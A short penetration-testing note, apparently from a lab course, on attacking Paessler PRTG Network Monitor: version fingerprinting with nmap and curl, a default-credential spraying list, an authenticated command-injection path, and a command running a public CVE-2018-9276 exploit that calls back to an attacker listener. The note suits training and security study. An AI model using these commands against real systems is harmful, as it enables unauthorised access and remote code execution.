### Footprinting + Enumeration
nmap output
```bash
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
### Exploitation
#### Password Spraying
`prtgadmin:prtgadmin` is often left unchanged
```bash
prtgadmin
Password123
admin
root
prtgadmin!
```

#### RCE via
This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it

`Setup` -> `Account Settings` -> `Notifications` -> `Add new notification`
#### Known Vulnerabilities
##### [CVE-2018-9276](https://github.com/wildkindcc/CVE-2018-9276)
PRTG version `17.3.33.2830` is likely vulnerable to [CVE-2018-9276](https://github.com/wildkindcc/CVE-2018-9276) which is an authenticated command injection in the PRTG System Administrator web console

```bash
python3 CVE-2018-9276.py -i 172.16.1.15 -p 8080 --lhost 172.16.1.45 --lport 4443 --user prtgadmin --password prtgadmin 
```
